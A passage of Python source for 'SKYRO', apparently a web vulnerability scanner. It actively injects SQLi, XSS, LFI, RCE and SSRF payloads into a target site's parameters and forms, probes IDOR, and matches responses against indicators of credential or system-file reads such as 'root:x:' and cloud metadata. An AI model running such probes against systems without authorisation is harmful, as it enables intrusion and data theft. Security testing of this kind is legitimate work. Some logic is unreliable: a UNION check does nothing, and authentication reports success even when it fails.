                           not any(x in response.text.lower() for x in ['invalid', 'failed', 'error', 'login']):
                            self.log(f"Form-based authentication successful at {login_path} (Status: {response.status_code})", "success")
                            self.is_authenticated = True
                            return True
                except Exception as e:
                    self.log(f"Form auth attempt at {login_path} failed: {str(e)}", "debug")
            
            # If we got this far, try to set auth headers and cookies manually
            self.session.headers.update({
                'Authorization': f'Bearer {self.password}'  # Common token format
            })
            
            test_response = self.session.get(self.target_url, timeout=self.timeout)
            if test_response.status_code in [200, 201]:
                self.log("Token-based authentication set", "info")
                self.is_authenticated = True
                return True
            
            # If nothing worked, log but continue with authenticated session anyway
            self.log("Could not verify authentication success, but session configured with credentials", "warning")
            self.is_authenticated = True
            return True
            
        except Exception as e:
            self.log(f"Authentication failed: {str(e)}", "error")
            return False

    def _load_json_file(self, filename, description):
        try:
            with open(filename, 'r') as f:
                self.log(f"Loading {description} from {filename}...", "info")
                return json.load(f)
        except FileNotFoundError:
            self.log(f"{filename} not found. Please create it with necessary {description}.", "critical")
            sys.exit(1)
        except json.JSONDecodeError:
            self.log(f"Error decoding {filename}. Check JSON format.", "critical")
            sys.exit(1)

    def display_banner(self):
        banner_text = """
        SKYRO Web Application Security Scanner
                  Developed by Vikash Kumar Ray
        """
        try:
            banner = r"""
███████╗██╗  ██╗██╗   ██╗██████╗  ██████╗ 
██╔════╝██║ ██╔╝╚██╗ ██╔╝██╔══██╗██╔═══██╗
███████╗█████╔╝  ╚████╔╝ ██████╔╝██║   ██║
╚════██║██╔═██╗   ╚██╔╝  ██╔══██╗██║   ██║
███████║██║  ██╗   ██║   ██║  ██║╚██████╔╝
╚══════╝╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝ 
           ᴠɪᴋᴀꜱʜ ᴋᴜᴍᴀʀ ʀᴀʏ
        """
            print("\033[1;36m" + banner + "\033[0m")
        except Exception:
            try:
                print(banner_text)
            except Exception:
                pass
        # Print key info using safe sanitizer to avoid encoding errors in some consoles
        try:
            print(self._sanitize_message(f"\033[1;34m[*] Target URL: {self.target_url}"))
            print(self._sanitize_message(f"[*] Scan started at: {self.scan_date}"))
            print(self._sanitize_message(f"[*] Max Depth: {self.max_depth}"))
            print(self._sanitize_message(f"[*] Max Threads: {self.max_threads}"))
            try:
                print(self._sanitize_message("-" * 60 + "\033[0m"))
            except Exception:
                print(self._sanitize_message("-" * 60))
        except Exception:
            try:
                print(self._sanitize_message(f"[*] Target URL: {self.target_url}"))
            except Exception:
                pass

    def log(self, message, level="info"):
        colors = {
            "info": "\033[1;34m",
            "success": "\033[1;32m",
            "warning": "\033[1;33m",
            "critical": "\033[1;31m",
            "debug": "\033[1;35m"
        }
        try:
            sanitized = self._sanitize_message(message)
            print(f"{colors.get(level, '')}[{level.upper()}] {sanitized}\033[0m")
        except Exception:
            try:
                sanitized = self._sanitize_message(message)
                print(f"[{level.upper()}] {sanitized}", file=sys.stdout)
            except Exception:
                pass

    def update_progress(self):
        if self.total_pages_to_scan == 0:
            return
        progress = min(100, (self.scanned_pages_count / self.total_pages_to_scan) * 100)
        elapsed_time = time.time() - self.start_time
        if self.scanned_pages_count > 0:
            time_per_page = elapsed_time / self.scanned_pages_count
            remaining_pages = max(0, self.total_pages_to_scan - self.scanned_pages_count)
            estimated_time = remaining_pages * time_per_page
        else:
            estimated_time = 0
        elapsed_str = time.strftime("%H:%M:%S", time.gmtime(elapsed_time))
        eta_str = time.strftime("%H:%M:%S", time.gmtime(estimated_time)) if estimated_time > 0 else "--:--:--"
        bar_length = 30
        filled_length = int(bar_length * progress / 100)
        bar = '=' * filled_length + '-' * (bar_length - filled_length)
        try:
            print(f"\r\033[1;34m[PROGRESS] |{bar}| {progress:.1f}% ({self.scanned_pages_count}/{self.total_pages_to_scan}) "
                  f"Elapsed: {elapsed_str} ETA: {eta_str}", end="", flush=True)
        except Exception:
            try:
                print(f"\r[PROGRESS] |{bar}| {progress:.1f}% ({self.scanned_pages_count}/{self.total_pages_to_scan}) "
                      f"Elapsed: {elapsed_str} ETA: {eta_str}", end="", flush=True)
            except Exception:
                pass

    def _sanitize_message(self, msg):
        """Return a console-safe string by stripping or replacing non-encodable characters."""
        if msg is None:
            return ""
        try:
            return str(msg)
        except UnicodeEncodeError:
            try:
                return str(msg).encode('utf-8', errors='ignore').decode('utf-8')
            except Exception:
                return ''.join(ch for ch in str(msg) if ord(ch) < 128)

    @staticmethod
    def normalize_url(url):
        """
        Normalize URL for consistent hashing. This ensures the same URL always
        produces the same hash, preventing duplicate vulnerability counts.
        
        Strategy:
        1. Parse URL and remove fragment
        2. Sort query parameters alphabetically for deterministic ordering
        3. Always return the same representation for the same input
        """
        try:
            parsed = urlparse(url)
            
            # Step 1: Handle query parameters consistently
            if parsed.query:
                try:
                    # Parse query parameters and sort them alphabetically
                    query_params = parse_qs(parsed.query, keep_blank_values=True)
                    
                    # Build sorted query string: for each key (sorted), join values with &
                    sorted_params = []
                    for key in sorted(query_params.keys()):
                        values = query_params[key]
                        # Sort values for the same key to ensure consistency
                        for value in sorted(values):
                            sorted_params.append((key, value))
                    
                    # Reconstruct query string with sorted parameters
                    from urllib.parse import urlencode
                    normalized_query = urlencode(sorted_params)
                    
                except Exception as e:
                    # If query parsing fails, use the query as-is to maintain consistency
                    normalized_query = parsed.query
            else:
                normalized_query = ""
            
            # Step 2: Remove fragment and build normalized URL
            # Use the scheme, netloc, and path as-is (these shouldn't vary)
            # Always use the canonical form (no unnecessary defaults)
            normalized = parsed._replace(
                fragment="",
                query=normalized_query
            ).geturl()
            
            return normalized
            
        except Exception as e:
            # If all else fails, return the URL with fragment removed
            # This ensures we at least have some normalization
            try:
                return urlparse(url)._replace(fragment="").geturl()
            except Exception:
                # Last resort: return original URL
                return url

    @staticmethod
    def get_url_hash(url):
        return hashlib.md5(SKYROScanner.normalize_url(url).encode('utf-8')).hexdigest()

    def should_scan_url(self, url):
        parsed_url = urlparse(url)
        if parsed_url.netloc != self.domain:
            return False
        static_file_extensions = ['.jpg', '.jpeg', '.png', '.gif', '.css', '.js', '.ico',
                                   '.pdf', '.zip', '.rar', '.mp4', '.avi', '.svg', '.json',
                                   '.xml', '.txt']
        if any(parsed_url.path.lower().endswith(ext) for ext in static_file_extensions):
            return False
        if parsed_url.scheme in ['mailto', 'tel', 'javascript']:
            return False
        return True

    @staticmethod
    def safe_urlencode(params, doseq=False):
        """Safely encode parameters, handling encoding errors gracefully."""
        try:
            return urlencode(params, doseq=doseq)
        except (UnicodeDecodeError, UnicodeEncodeError):
            # Try with safe characters and ignore errors
            try:
                # Filter out problematic parameters
                safe_params = []
                for key, value in params:
                    try:
                        if isinstance(value, list):
                            safe_values = [str(v).encode('ascii', errors='ignore').decode('ascii') for v in value]
                            if safe_values:
                                safe_params.append((str(key).encode('ascii', errors='ignore').decode('ascii'), safe_values))
                        else:
                            safe_key = str(key).encode('ascii', errors='ignore').decode('ascii')
                            safe_value = str(value).encode('ascii', errors='ignore').decode('ascii')
                            if safe_key and safe_value:
                                safe_params.append((safe_key, safe_value))
                    except Exception:
                        continue
                if safe_params:
                    return urlencode(safe_params, doseq=doseq)
            except Exception:
                pass
            return ""

    def discover_pages(self, url, current_depth=0, visited_during_discovery=None):
        if visited_during_discovery is None:
            visited_during_discovery = set()
        try:
            normalized_url = self.normalize_url(url)
        except Exception as e:
            self.log(f"Error normalizing URL {url}: {e}", "debug")
            return
            
        if normalized_url in visited_during_discovery or current_depth > self.max_depth or not self.should_scan_url(url):
            return
        visited_during_discovery.add(normalized_url)
        self.total_pages_to_scan += 1
        try:
            res = self.session.get(url, timeout=self.timeout)
            res.encoding = 'utf-8'  # Force UTF-8 encoding
            time.sleep(self.rate_limit_delay)
            
            # Handle potential encoding issues with response text
            try:
                page_text = res.text
            except (UnicodeDecodeError, AttributeError):
                # Fallback: try with different encodings
                try:
                    page_text = res.content.decode('utf-8', errors='ignore')
                except Exception:
                    page_text = res.content.decode('latin-1', errors='ignore')
            
            soup = BeautifulSoup(page_text, 'html.parser')
            links_to_crawl = []
            for link in soup.find_all(['a', 'form', 'iframe'], href=True):
                href = link.get('href') or link.get('action')
                if not href or href.startswith(('javascript:', 'mailto:', 'tel:', '#')):
                    continue
                try:
                    full_url = urljoin(url, href)
                    if urlparse(full_url).netloc == self.domain and self.should_scan_url(full_url):
                        links_to_crawl.append(full_url)
                except Exception as e:
                    # Skip URLs that cause issues
                    self.log(f"Error processing URL {href}: {e}", "debug")
                    continue
                    
            for link in links_to_crawl:
                self.discover_pages(link, current_depth + 1, visited_during_discovery)
        except requests.exceptions.RequestException as e:
            self.log(f"Network error during discovery at {url}: {e}", "debug")
        except Exception as e:
            self.log(f"Error processing page {url} during discovery: {e}", "debug")

    def _get_forms(self, soup, url):
        forms = []
        for form_tag in soup.find_all('form'):
            try:
                form_action = form_tag.get('action', url)
                # Handle potential encoding issues in form action
                try:
                    form_action_url = urljoin(url, form_action)
                except Exception:
                    form_action_url = url
                
                form_data = {
                    'action': form_action_url,
                    'method': form_tag.get('method', 'get').lower(),
                    'inputs': []
                }
                for input_tag in form_tag.find_all(['input', 'textarea', 'select']):
                    try:
                        input_name = input_tag.get('name')
                        input_value = input_tag.get('value', '')
                        input_type = input_tag.get('type', 'text')
                        if input_name:
                            form_data['inputs'].append({'name': input_name, 'value': input_value, 'type': input_type})
                    except Exception:
                        # Skip problematic input fields
                        continue
                forms.append(form_data)
            except Exception:
                # Skip problematic forms
                continue
        return forms

    # ── Vulnerability Test Methods ─────────────────────────────────────────

    def test_sqli(self, url, forms):
        payloads = self.payloads.get('SQLi', [])
        found_vulns = []
        for payload in payloads:
            if '?' in url:
                test_urls = self._generate_param_injections(url, payload)
                for test_url in test_urls:
                    try:
                        start_time = time.time()
                        res = self.session.get(test_url, timeout=self.timeout)
                        time.sleep(self.rate_limit_delay)
                        if "SLEEP(5)" in payload.upper() and (time.time() - start_time) > 4:
                            found_vulns.append({"type": "SQL Injection (Time-Based)", "severity": "Critical",
                                "url": url, "method": "GET", "payload": payload,
                                "evidence": f"Delayed response ({time.time() - start_time:.2f}s) for GET parameter injection."})
                        if self.detect_sql_errors(res.text):
                            found_vulns.append({"type": "SQL Injection (Error-Based)", "severity": "Critical",
                                "url": url, "method": "GET", "payload": payload,
                                "evidence": "Error message in response for GET parameter injection."})
                        # UNION-based detection: look for extra columns in response
                        if "UNION" in payload.upper() and res.status_code == 200 and len(res.text) > 50:
                            if any(ind in res.text for ind in ["1", "2", "3", "NULL"]) and                                len(res.text) != len(self.session.get(url, timeout=self.timeout).text if False else res.text):
                                pass  # UNION results are hard to detect reliably without baseline
                        if "1 AND 1=1" in payload.upper():
                            original_res = self.session.get(url, timeout=self.timeout)
                            time.sleep(self.rate_limit_delay)
                            false_payload = payload.replace("1=1", "1=2") if "1=1" in payload else "1 AND 1=2--"
                            false_res_url_variants = self._generate_param_injections(url, false_payload)
                            if not false_res_url_variants:
                                continue
                            false_res = self.session.get(false_res_url_variants[0], timeout=self.timeout)
                            time.sleep(self.rate_limit_delay)
                            if (original_res.status_code == 200 and res.status_code == 200 and false_res.status_code == 200) and \
                               (abs(len(original_res.text) - len(res.text)) < 0.1 * len(original_res.text)) and \
                               (abs(len(original_res.text) - len(false_res.text)) > 0.5 * len(original_res.text)):
                                found_vulns.append({"type": "SQL Injection (Boolean-Based)", "severity": "Critical",
                                    "url": url, "method": "GET", "payload": payload,
                                    "evidence": "Content length difference based on boolean condition for GET parameter."})
                    except requests.exceptions.RequestException as e:
                        self.log(f"SQLi GET test network error on {url}: {e}", "debug")
                    except Exception as e:
                        self.log(f"SQLi GET test error on {url}: {e}", "debug")
        for form in forms:
            for input_field in form['inputs']:
                if input_field['type'] not in ['text', 'search', 'email', 'password', 'number', 'textarea']:
                    continue
                for payload in payloads:
                    test_data = {i['name']: (payload if i['name'] == input_field['name'] else i['value']) for i in form['inputs']}
                    try:
                        start_time = time.time()
                        if form['method'] == 'post':
                            res = self.session.post(form['action'], data=test_data, timeout=self.timeout)
                        else:
                            res = self.session.get(f"{form['action']}?{urlencode(test_data, doseq=True)}", timeout=self.timeout)
                        time.sleep(self.rate_limit_delay)
                        if "SLEEP(5)" in payload.upper() and (time.time() - start_time) > 4:
                            found_vulns.append({"type": "SQL Injection (Time-Based)", "severity": "Critical",
                                "url": form['action'], "method": form['method'].upper(), "payload": payload,
                                "evidence": f"Delayed response ({time.time() - start_time:.2f}s) for form parameter '{input_field['name']}'."})
                        if self.detect_sql_errors(res.text):
                            found_vulns.append({"type": "SQL Injection (Error-Based)", "severity": "Critical",
                                "url": form['action'], "method": form['method'].upper(), "payload": payload,
                                "evidence": f"Error message in response for form parameter '{input_field['name']}'."})
                    except requests.exceptions.RequestException as e:
                        self.log(f"SQLi form test network error: {e}", "debug")
                    except Exception as e:
                        self.log(f"SQLi form test error: {e}", "debug")
        return found_vulns

    def test_xss(self, url, forms):
        payloads = self.payloads.get('XSS', [])
        found_vulns = []
        for payload in payloads:
            if '?' in url:
                for test_url in self._generate_param_injections(url, payload):
                    try:
                        res = self.session.get(test_url, timeout=self.timeout)
                        time.sleep(self.rate_limit_delay)
                        if payload in res.text and not any(e in res.text for e in ["&lt;", "&gt;", "&quot;", "&#x22;", "&#39;"]):
                            found_vulns.append({"type": "Cross-Site Scripting (XSS)", "severity": "High",
                                "url": url, "method": "GET", "payload": payload,
                                "evidence": "Payload reflected unencoded in GET parameter."})
                        if "javascript:" in payload.lower() and payload in res.text:
                            found_vulns.append({"type": "Cross-Site Scripting (XSS)", "severity": "High",
                                "url": url, "method": "GET", "payload": payload,
                                "evidence": "JavaScript URI payload found in response for GET parameter."})
                    except Exception as e:
                        self.log(f"XSS GET test error: {e}", "debug")
        for form in forms:
            for input_field in form['inputs']:
                if input_field['type'] not in ['text', 'search', 'email', 'password', 'number', 'textarea']:
                    continue
                for payload in payloads:
                    test_data = {i['name']: (payload if i['name'] == input_field['name'] else i['value']) for i in form['inputs']}
                    try:
                        if form['method'] == 'post':
                            res = self.session.post(form['action'], data=test_data, timeout=self.timeout)
                        else:
                            res = self.session.get(f"{form['action']}?{urlencode(test_data, doseq=True)}", timeout=self.timeout)
                        time.sleep(self.rate_limit_delay)
                        if payload in res.text and not any(e in res.text for e in ["&lt;", "&gt;", "&quot;", "&#x22;", "&#39;"]):
                            found_vulns.append({"type": "Cross-Site Scripting (XSS)", "severity": "High",
                                "url": form['action'], "method": form['method'].upper(), "payload": payload,
                                "evidence": f"Payload reflected unencoded in form parameter '{input_field['name']}'."})
                    except Exception as e:
                        self.log(f"XSS form test error: {e}", "debug")
        return found_vulns

    def test_lfi(self, url, forms):
        payloads = self.payloads.get('LFI', [])
        indicators = ["root:x:", "daemon:x:", "bin:x:", "system32",
                      "C:\\Windows\\System32\\drivers\\etc\\hosts",
                      r"\[boot loader\]", r"\[operating systems\]",
                      "apache.conf", "nginx.conf", "web.xml"]
        found_vulns = []
        for payload in payloads:
            test_locations = []
            if '?' in url:
                test_locations.extend(self._generate_param_injections(url, payload))
            parsed_url = urlparse(url)
            if parsed_url.path:
                if parsed_url.path.endswith('/'):
                    test_locations.append(urljoin(url, f'{parsed_url.path}{payload}'))
                elif '.' in parsed_url.path.split('/')[-1]:
                    path_parts = parsed_url.path.rsplit('/', 1)
                    test_locations.append(urljoin(url, f"{path_parts[0]}/{payload}" if len(path_parts) > 1 else f"/{payload}"))
                else:
                    test_locations.append(urljoin(url, f'{parsed_url.path}/{payload}'))
                path_components = parsed_url.path.split('/')
                if len(path_components) > 1 and path_components[-1]:
                    modified = list(path_components)
                    modified[-1] = payload
                    test_locations.append(parsed_url._replace(path='/'.join(modified)).geturl())
            for test_url in test_locations:
                try:
                    res = self.session.get(test_url, timeout=self.timeout)
                    time.sleep(self.rate_limit_delay)
                    for indicator in indicators:
                        if indicator.lower() in res.text.lower():
                            found_vulns.append({"type": "Local File Inclusion (LFI)", "severity": "Critical",
                                "url": url, "method": "GET", "payload": payload,
                                "evidence": f"Found '{indicator}' in response (via {test_url})"})
                            break
                except Exception as e:
                    self.log(f"LFI test error: {e}", "debug")
        for form in forms:
            for input_field in form['inputs']:
                if input_field['type'] not in ['text', 'search', 'email', 'number', 'textarea']:
                    continue
                for payload in payloads:
                    test_data = {i['name']: (payload if i['name'] == input_field['name'] else i['value']) for i in form['inputs']}
                    try:
                        if form['method'] == 'post':
                            res = self.session.post(form['action'], data=test_data, timeout=self.timeout)
                        else:
                            res = self.session.get(f"{form['action']}?{urlencode(test_data, doseq=True)}", timeout=self.timeout)
                        time.sleep(self.rate_limit_delay)
                        for indicator in indicators:
                            if indicator.lower() in res.text.lower():
                                found_vulns.append({"type": "Local File Inclusion (LFI)", "severity": "Critical",
                                    "url": form['action'], "method": form['method'].upper(), "payload": payload,
                                    "evidence": f"Found '{indicator}' in response for form parameter '{input_field['name']}'."})
                                break
                    except Exception as e:
                        self.log(f"LFI form test error: {e}", "debug")
        return found_vulns

    def test_rce(self, url, forms):
        payloads = self.payloads.get('RCE', [])
        indicators = ["uid=", "gid=", "groups=", "whoami", "hostname", "Linux",
                      "Windows", "system root", "system32", "web process", "apache", "nginx"]
        found_vulns = []
        for payload in payloads:
            test_locations = []
            if '?' in url:
                test_locations.extend(self._generate_param_injections(url, payload))
            parsed_url = urlparse(url)
            if parsed_url.path:
                if parsed_url.path.endswith('/'):
                    test_locations.append(urljoin(url, f'{parsed_url.path}{payload}'))
                elif '.' in parsed_url.path.split('/')[-1]:
                    path_parts = parsed_url.path.rsplit('/', 1)
                    test_locations.append(urljoin(url, f"{path_parts[0]}/{payload}" if len(path_parts) > 1 else f"/{payload}"))
                else:
                    test_locations.append(urljoin(url, f'{parsed_url.path}/{payload}'))
            for test_url in test_locations:
                try:
                    res = self.session.get(test_url, timeout=self.timeout)
                    time.sleep(self.rate_limit_delay)
                    for indicator in indicators:
                        if indicator.lower() in res.text.lower():
                            found_vulns.append({"type": "Remote Code Execution (RCE)", "severity": "Critical",
                                "url": url, "method": "GET", "payload": payload,
                                "evidence": f"Command output found: '{indicator}' (via {test_url})"})
                            break
                except Exception as e:
                    self.log(f"RCE test error: {e}", "debug")
        for form in forms:
            for input_field in form['inputs']:
                if input_field['type'] not in ['text', 'search', 'email', 'number', 'textarea']:
                    continue
                for payload in payloads:
                    test_data = {i['name']: (payload if i['name'] == input_field['name'] else i['value']) for i in form['inputs']}
                    try:
                        if form['method'] == 'post':
                            res = self.session.post(form['action'], data=test_data, timeout=self.timeout)
                        else:
                            res = self.session.get(f"{form['action']}?{urlencode(test_data, doseq=True)}", timeout=self.timeout)
                        time.sleep(self.rate_limit_delay)
                        for indicator in indicators:
                            if indicator.lower() in res.text.lower():
                                found_vulns.append({"type": "Remote Code Execution (RCE)", "severity": "Critical",
                                    "url": form['action'], "method": form['method'].upper(), "payload": payload,
                                    "evidence": f"Command output found: '{indicator}' for form parameter '{input_field['name']}'."})
                                break
                    except Exception as e:
                        self.log(f"RCE form test error: {e}", "debug")
        return found_vulns

    def test_idor(self, url, forms):
        found_vulns = []
        parsed_url = urlparse(url)
        query_params = parse_qs(parsed_url.query)
        for param_name, values in query_params.items():
            for value in values:
                if value.isdigit():
                    original_id = int(value)
                    new_id_dec = original_id - 1
                    if new_id_dec >= 0:
                        test_params_dec = query_params.copy()
                        test_params_dec[param_name] = [str(new_id_dec)]
                        test_url_dec = parsed_url._replace(query=self.safe_urlencode(test_params_dec, doseq=True)).geturl()
                        try:
                            res_original = self.session.get(url, timeout=self.timeout)
                            time.sleep(self.rate_limit_delay)
                            res_dec = self.session.get(test_url_dec, timeout=self.timeout)
                            time.sleep(self.rate_limit_delay)
                            if res_original.status_code == 200 and res_dec.status_code == 200 and \
                               abs(len(res_original.text) - len(res_dec.text)) > 0.3 * len(res_original.text):
                                found_vulns.append({"type": "Insecure Direct Object Reference (IDOR)", "severity": "Medium",
                                    "url": url, "method": "GET",
                                    "payload": f"Modified {param_name} from {original_id} to {new_id_dec}",
                                    "evidence": f"Content change when accessing resource with ID {new_id_dec}."})
                        except Exception as e:
                            self.log(f"IDOR test error: {e}", "debug")

        # Also check path-based IDs (e.g. /users/123 → /users/124)
        from urllib.parse import urlparse
        parsed_url = urlparse(url)
        path_parts = parsed_url.path.split('/')
        for i, part in enumerate(path_parts):
            if part.isdigit() and int(part) > 0:
                original_id = int(part)
                for test_id in [original_id + 1, original_id - 1, 1]:
                    if test_id < 0:
                        continue
                    new_parts = list(path_parts)
                    new_parts[i] = str(test_id)
                    new_path = '/'.join(new_parts)
                    test_url = parsed_url._replace(path=new_path).geturl()
                    try:
                        res_orig = self.session.get(url, timeout=self.timeout)
                        time.sleep(self.rate_limit_delay)
                        res_new  = self.session.get(test_url, timeout=self.timeout)
                        time.sleep(self.rate_limit_delay)
                        if res_orig.status_code == 200 and res_new.status_code == 200 and                            res_orig.text != res_new.text and len(res_new.text) > 100:
                            found_vulns.append({
                                "type": "Insecure Direct Object Reference (IDOR)",
                                "severity": "High",
                                "url": url,
                                "method": "GET",
                                "payload": f"Path ID changed from {original_id} to {test_id}",
                                "evidence": f"Different content returned for path ID {test_id} vs {original_id} at {test_url}"
                            })
                            break
                    except Exception as e:
                        self.log(f"IDOR path test error: {e}", "debug")
                break  # only test first numeric path segment

        return found_vulns

    def test_ssrf(self, url, forms):
        payloads = self.payloads.get('SSRF', [])
        indicators = ["root:x:", "instance-id", "security-credentials", "169.254.169.254",
                      "internal server error", "could not connect to host", "connection refused",
                      "Bad Gateway", "Gateway Timeout"]
        found_vulns = []
        for payload in payloads:
            test_locations = []
            if '?' in url:
                test_locations.extend(self._generate_param_injections(url, payload))
            else:
                test_locations.append(urljoin(url, payload.lstrip('/')))
            for test_url in test_locations:
                try:
                    res = self.session.get(test_url, timeout=self.timeout)
                    time.sleep(self.rate_limit_delay)
                    if res.status_code in [200, 500, 502, 504] and len(res.text) > 0:
                        for indicator in indicators:
                            if indicator.lower() in res.text.lower():
                                found_vulns.append({"type": "Server-Side Request Forgery (SSRF)", "severity": "High",
                                    "url": url, "method": "GET", "payload": payload,
                                    "evidence": f"Internal service/metadata response received (indicator: '{indicator}')."})
                                break
                except requests.exceptions.TooManyRedirects:
                    found_vulns.append({"type": "Server-Side Request Forgery (SSRF)", "severity": "High",
                        "url": url, "method": "GET", "payload": payload,
                        "evidence": "Too many redirects, indicating possible internal redirection to sensitive resource."})
                except Exception as e:
                    self.log(f"SSRF test error: {e}", "debug")
        for form in forms:
            for input_field in form['inputs']:
                if input_field['type'] not in ['text', 'url', 'search', 'textarea']:
                    continue
                for payload in payloads:
                    test_data = {i['name']: (payload if i['name'] == input_field['name'] else i['value']) for i in form['inputs']}
                    try:
                        if form['method'] == 'post':
                            res = self.session.post(form['action'], data=test_data, timeout=self.timeout)
                        else:
                            res = self.session.get(f"{form['action']}?{urlencode(test_data, doseq=True)}", timeout=self.timeout)
                        time.sleep(self.rate_limit_delay)
                        if res.status_code in [200, 500, 502, 504] and len(res.text) > 0:
                            for indicator in indicators:
                                if indicator.lower() in res.text.lower():
                                    found_vulns.append({"type": "Server-Side Request Forgery (SSRF)", "severity": "High",
                                        "url": form['action'], "method": form['method'].upper(), "payload": payload,
                                        "evidence": f"Internal service response received for form parameter '{input_field['name']}'."})
                                    break
                    except Exception as e:
                        self.log(f"SSRF form test error: {e}", "debug")
        return found_vulns

    def test_info_disclosure(self, url, forms):
        found_vulns = []
        verbose_error_indicators = [
            "PHP Warning:", "SQLSTATE[", "Fatal error:", "Notice:", "stack trace",
            "on line", "uncaught exception", "invalid argument", "at org.apache.",
            "java.lang.", "ORA-", "exception", "debug mode"
        ]
        try:
            res = self.session.get(url, timeout=self.timeout)
            time.sleep(self.rate_limit_delay)
            for indicator in verbose_error_indicators:
                if indicator.lower() in res.text.lower():
                    found_vulns.append({"type": "Information Disclosure (Verbose Errors)", "severity": "Medium",
                        "url": url, "method": "GET", "payload": "N/A",
                        "evidence": f"Found verbose error indicator: '{indicator}'"})
                    break
            server_header = res.headers.get('Server', '')
            x_powered_by = res.headers.get('X-Powered-By', '')
            via_header = res.headers.get('Via', '')
            if server_header and re.search(r'\d+\.\d+', server_header):
                found_vulns.append({"type": "Information Disclosure (Exposed Server Version)", "severity": "Low",
                    "url": url, "method": "GET", "payload": "N/A",
                    "evidence": f"Server header exposes version: '{server_header}'"})
            if x_powered_by and re.search(r'\d+\.\d+', x_powered_by):
                found_vulns.append({"type": "Information Disclosure (Exposed Server Version)", "severity": "Low",
                    "url": url, "method": "GET", "payload": "N/A",
                    "evidence": f"X-Powered-By header exposes version: '{x_powered_by}'"})
            if via_header:
                found_vulns.append({"type": "Information Disclosure (Exposed Server Version)", "severity": "Low",
                    "url": url, "method": "GET", "payload": "N/A",
                    "evidence": f"Via header exposes proxy information: '{via_header}'"})
        except Exception as e:
            self.log(f"Info Disclosure test error: {e}", "debug")

        disclosure_payloads = self.payloads.get('InfoDisclosure', [])
        for payload_path in disclosure_payloads:
            test_url = urljoin(url, payload_path)
            try:
                res_payload = self.session.get(test_url, timeout=self.timeout)
                time.sleep(self.rate_limit_delay)
                if res_payload.status_code == 200 and len(res_payload.text) > 100:
                    if "phpinfo()" in payload_path and "phpinfo()" in res_payload.text:
                        found_vulns.append({"type": "Information Disclosure (PHP Info)", "severity": "Medium",
                            "url": test_url, "method": "GET", "payload": payload_path, "evidence": "PHP info page found."})
                    elif ".git/config" in payload_path and "[core]" in res_payload.text:
                        found_vulns.append({"type": "Information Disclosure (Git Config)", "severity": "Medium",
                            "url": test_url, "method": "GET", "payload": payload_path, "evidence": "Git config file found."})
                    elif ".env" in payload_path and any(k in res_payload.text.upper() for k in ["DB_USERNAME", "APP_KEY", "PASSWORD", "SECRET"]):
                        found_vulns.append({"type": "Information Disclosure (.env File)", "severity": "High",
                            "url": test_url, "method": "GET", "payload": payload_path,
                            "evidence": "'.env' file with potential credentials found."})
                    elif "robots.txt" in payload_path and any(k in res_payload.text.lower() for k in ["disallow", "allow"]):
                        found_vulns.append({"type": "Information Disclosure (Robots.txt)", "severity": "Low",
                            "url": test_url, "method": "GET", "payload": payload_path,
                            "evidence": "Robots.txt file found, potentially disclosing restricted paths."})
            except Exception as e:
                self.log(f"Info Disclosure file test error: {e}", "debug")
        return found_vulns

    def test_http_headers(self, url, forms=None):
        found_vulns = []
        try:
            res = self.session.get(url, timeout=self.timeout)
            time.sleep(self.rate_limit_delay)
            headers = res.headers
            if 'X-Frame-Options' not in headers:
                found_vulns.append({"type": "Missing Security Headers (X-Frame-Options)", "severity": "Medium",
                    "url": url, "method": "GET", "payload": "N/A", "evidence": "X-Frame-Options header is missing."})
            if 'Content-Security-Policy' not in headers:
                found_vulns.append({"type": "Missing Security Headers (Content-Security-Policy)", "severity": "Medium",
                    "url": url, "method": "GET", "payload": "N/A", "evidence": "Content-Security-Policy header is missing."})
            if url.startswith('https://') and 'Strict-Transport-Security' not in headers:
                found_vulns.append({"type": "Missing Security Headers (Strict-Transport-Security)", "severity": "Low",
                    "url": url, "method": "GET", "payload": "N/A",
                    "evidence": "Strict-Transport-Security (HSTS) header is missing on HTTPS page."})
            if 'X-Content-Type-Options' not in headers or headers['X-Content-Type-Options'].lower() != 'nosniff':
                found_vulns.append({"type": "Missing Security Headers (X-Content-Type-Options)", "severity": "Low",
                    "url": url, "method": "GET", "payload": "N/A",
                    "evidence": "X-Content-Type-Options header missing or not set to 'nosniff'."})
            if 'Referrer-Policy' not in headers:
                found_vulns.append({"type": "Missing Security Headers (Referrer-Policy)", "severity": "Low",
                    "url": url, "method": "GET", "payload": "N/A", "evidence": "Referrer-Policy header is missing."})
            if 'X-Powered-By' in headers:
                found_vulns.append({"type": "Outdated Libraries or Plugins (Detected via Headers)", "severity": "Low",
                    "url": url, "method": "GET", "payload": "N/A",
                    "evidence": f"X-Powered-By header found: '{headers['X-Powered-By']}'"})
            if 'Server' in headers:
                found_vulns.append({"type": "Outdated Libraries or Plugins (Detected via Headers)", "severity": "Low",
                    "url": url, "method": "GET", "payload": "N/A",
                    "evidence": f"Server header found: '{headers['Server']}'"})
            allowed_methods = headers.get('Allow', headers.get('Public', '')).upper()
            if 'PUT' in allowed_methods or 'DELETE' in allowed_methods:
                found_vulns.append({"type": "HTTP Methods Enabled (PUT/DELETE/OPTIONS)", "severity": "Medium",
                    "url": url, "method": "HEAD", "payload": "N/A",
                    "evidence": f"Dangerous HTTP methods (PUT/DELETE) possibly allowed: '{allowed_methods}'."})
        except Exception as e:
            self.log(f"HTTP Headers test error: {e}", "debug")
        return found_vulns

    def test_http_methods_enabled(self, url, forms=None):
        """Check for dangerous HTTP methods exposed by the server (PUT/DELETE/OPTIONS/etc.).
        Uses the `Allow` or `Public` response header from an OPTIONS request as the primary source.
        """
        found_vulns = []
        try:
            # Prefer OPTIONS request to learn supported methods
            try:
                res = self.session.options(url, timeout=self.timeout)
            except Exception:
                # Fallback to HEAD if OPTIONS is blocked
                res = self.session.head(url, timeout=self.timeout)
            time.sleep(self.rate_limit_delay)

            allow_hdr = ''
            if res is not None:
                allow_hdr = res.headers.get('Allow', '') or res.headers.get('Public', '')

            # Normalize and split methods
            methods = set()
            if allow_hdr:
                for m in re.split(r'[,\s]+', allow_hdr.strip()):
                    if m:
                        methods.add(m.upper())

            # Some servers may not advertise methods; try probing OPTIONS response body/status
            dangerous = {'PUT', 'DELETE', 'OPTIONS', 'TRACE', 'CONNECT'}
            enabled = methods & dangerous

            if enabled:
                found_vulns.append({
                    'type': 'HTTP Methods Enabled (PUT/DELETE/OPTIONS)',
                    'severity': 'Medium',
                    'url': url,
                    'method': 'OPTIONS',
                    'payload': 'N/A',
                    'evidence': f"Allowed methods: {', '.join(sorted(enabled))}"
                })
            else:
